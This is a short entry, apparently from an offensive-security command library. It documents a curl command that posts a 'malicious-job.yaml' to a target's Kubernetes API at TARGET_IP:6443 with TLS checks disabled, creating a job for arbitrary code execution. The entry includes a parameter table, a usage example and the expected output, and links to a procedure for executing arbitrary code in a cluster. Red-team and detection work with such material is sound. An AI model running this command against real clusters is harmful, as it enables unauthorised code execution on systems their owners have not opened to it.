---
data: >-
  curl -k -X POST -H "Content-Type: application/yaml" --data-binary
  @malicious-job.yaml
  https://TARGET_IP:6443/apis/batch/v1/namespaces/default/jobs
tags:
  - kubernetes
  - execution
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: fd007b00-aa59-4400-ba6b-7367f6bf4d69
created_at: '2025-12-11T06:10:10.582Z'
updated_at: '2025-12-11T06:10:10.582Z'
verified: false
validated: true
submitted: true
---
# curl-create-kubernetes-job

## Command

```bash
curl -k -X POST -H "Content-Type: application/yaml" --data-binary @malicious-job.yaml https://TARGET_IP:6443/apis/batch/v1/namespaces/default/jobs
```

## Description

This command creates a Kubernetes job by posting a YAML definition to the API, enabling arbitrary code execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Insecure mode | Yes |
| `-X POST` | HTTP POST method | Yes |
| `-H "Content-Type: application/yaml"` | Set content type | Yes |
| `--data-binary @file.yaml` | YAML payload | Yes |
| `endpoint` | Jobs API endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -k -X POST -H "Content-Type: application/yaml" --data-binary @job.yaml https://TARGET_IP:6443/apis/batch/v1/namespaces/default/jobs
```

## Expected Output

JSON response confirming job creation, e.g., {"kind":"Job", "metadata":{"name":"malicious-job"}}

## Related

- [[procedures/Execute-Arbitrary-Code-in-Kubernetes-Cluster]]
- [[commands/curl-kubernetes-api-access]]
